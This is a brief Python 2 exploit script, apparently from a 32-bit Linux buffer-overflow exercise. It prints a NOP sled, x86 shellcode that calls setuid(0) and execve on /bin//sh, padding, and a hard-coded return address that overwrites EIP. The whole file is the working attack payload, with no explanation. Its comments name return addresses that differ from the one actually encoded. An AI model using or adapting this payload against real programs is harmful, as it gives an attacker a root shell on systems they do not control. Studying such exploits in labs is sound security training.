#!/usr/bin/python 

#64 - gives us a large target!
nopsled = '\x90' * 64 

#shellcode is 32 bytes long.
shellcode = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)
padding = 'A' * (112 - 64 - 32)

#bffff260 - convert to little endian
#bffffd20
eip = '\x20\xdf\xff\xbf'
print nopsled + shellcode + padding + eip
